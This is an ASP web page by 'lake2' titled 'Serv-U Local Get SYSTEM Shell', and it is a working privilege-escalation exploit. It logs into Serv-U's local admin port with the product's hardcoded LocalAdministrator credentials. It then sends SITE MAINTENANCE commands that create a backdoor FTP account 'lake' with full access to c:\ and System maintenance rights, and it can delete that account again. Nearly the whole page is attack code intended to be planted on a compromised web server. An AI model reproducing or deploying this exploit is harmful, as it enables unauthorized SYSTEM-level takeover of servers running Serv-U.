<title>Serv-U 2 admin by lake2</title>
<style type="text/css">
body,td,th {color: #0000FF;font-family: Verdana, Arial, Helvetica, sans-serif;}
body {background-color: #ffffff;font-size:14px; }
a:link {color: #0000FF;text-decoration: none;}
a:visited {text-decoration: none;color: #0000FF;}
a:hover {text-decoration: none;color: #FF0000;}
a:active {text-decoration: none;color: #FF0000;}
.buttom {color: #FFFFFF; border: 1px solid #084B8E; background-color: #719BC5}
.TextBox {border: 1px solid #084B8E}
</style>
 <p>Serv-U Local Get SYSTEM Shell with ASP
</p>
 <p>Author: lake2, <a href="http://lake2.0x54.org" target="_blank">http://lake2.0x54.org</a></p>
 <form name="form1" method="post" action="">
  <p>user:
    <input name="duser" type="text" class="TextBox" id="duser" value="LocalAdministrator">
    <br>
    pwd :
    <input name="dpwd" type="text" class="TextBox" id="dpwd" value="#l@$ak#.lk;0@P">
    <br>
  port:
  <input name="dport" type="text" class="TextBox" id="dport" value="43958">
  <br>
  <input name="radiobutton" type="radio" value="add" checked class="TextBox">
  Add User 
  <input type="radio" name="radiobutton" value="del" class="TextBox"> 
  Del User </p>
  <p>
    <input name="Submit" type="submit" class="buttom" value="Run">
  </p>
</form>
 <p>
   <%
Usr = request.Form("duser")
pwd = request.Form("dpwd")
port = request.Form("dport")
'Command = request.Form("dcmd")

	if request.Form("radiobutton") = "add" Then

lake2 = "User " & Usr & vbcrlf
lake2 = lake2 & "Pass " & pwd & vbcrlf
lake2 = lake2 &  "SITE MAINTENANCE" & vbcrlf
'lake2 = lake2 &  "-SETDOMAIN" & vbcrlf & "-Domain=cctv|0.0.0.0|43859|-1|1|0" & vbcrlf & "-TZOEnable=0" & vbcrlf & " TZOKey=" & vbcrlf
lake2 = lake2 & "-SETUSERSETUP" & vbcrlf & "-IP=0.0.0.0" & vbcrlf & "-PortNo=21" & vbcrlf & "-User=lake" & vbcrlf & "-Password=admin123" & vbcrlf & _
                    "-HomeDir=c:\\" & vbcrlf & "-LoginMesFile=" & vbcrlf & "-Disable=0" & vbcrlf & "-RelPaths=1" & vbcrlf & _
                    "-NeedSecure=0" & vbcrlf & "-HideHidden=0" & vbcrlf & "-AlwaysAllowLogin=0" & vbcrlf & "-ChangePassword=0" & vbcrlf & _
                    "-QuotaEnable=0" & vbcrlf & "-MaxUsersLoginPerIP=-1" & vbcrlf & "-SpeedLimitUp=0" & vbcrlf & "-SpeedLimitDown=0" & vbcrlf & _
                    "-MaxNrUsers=-1" & vbcrlf & "-IdleTimeOut=600" & vbcrlf & "-SessionTimeOut=-1" & vbcrlf & "-Expire=0" & vbcrlf & "-RatioUp=1" & vbcrlf & _
                    "-RatioDown=1" & vbcrlf & "-RatiosCredit=0" & vbcrlf & "-QuotaCurrent=0" & vbcrlf & "-QuotaMaximum=0" & vbcrlf & _
                    "-Maintenance=System" & vbcrlf & "-PasswordType=Regular" & vbcrlf & "-Ratios=None" & vbcrlf & " Access=c:\\|RWAMELCDP" & vbcrlf
		'lake2 = lake2 & "quit" & vbcrlf
		
		
		
		
		'--------
		'On Error Resume Next
		Set xPost = CreateObject("MSXML2.XMLHTTP")
		xPost.Open "POST", "http://127.0.0.1:"& port &"/lake2", True
		xPost.Send(lake2)
		Set xPOST=nothing
		response.write "FTP user lake  pass admin123 :)<br><BR>"
	else
	
		lake2 = "User " & Usr & vbcrlf
		lake2 = lake2 & "Pass " & pwd & vbcrlf
		lake2 = lake2 & "SITE MAINTENANCE" & vbcrlf
		lake2 = lake2 & "-DELETEUSER" & vbcrlf & "-IP=0.0.0.0" & vbcrlf & "-PortNo=21" & vbcrlf & " User=lake" & vbcrlf
		
		Set xPost3 = CreateObject("MSXML2.XMLHTTP")
		xPost3.Open "POST", "http://127.0.0.1:"& port &"/lake2", True
		xPost3.Send(lake2)
		Set xPOST3=nothing
		response.write "Done!<br><BR>"
	end if

%>
   Only for Enjoy&amp;Challenge
  
 ! </p>
 